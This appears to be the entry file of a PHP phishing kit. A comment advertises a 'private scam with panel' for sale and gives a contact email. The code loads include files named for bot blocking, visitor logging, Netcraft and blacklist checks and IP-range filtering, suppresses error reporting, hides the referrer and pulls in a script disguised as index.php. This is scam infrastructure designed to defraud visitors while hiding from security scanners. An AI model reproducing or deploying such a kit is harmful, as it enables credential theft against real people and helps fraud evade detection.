<?php @error_reporting(0);
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
require "../systemBOT.php";
require "../blocker.php";
require "../assets/includes/visitor_log.php";
require "../assets/includes/netcraft_check.php";
require "../assets/includes/blacklist_lookup.php";
require "../assets/includes/ip_range_check.php";

?>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" ></script>
<meta name="referrer" content="never">
<meta name="referrer" content="no-referrer">
<script src="../assets/js/index.php" type="text/javascript"></script>                     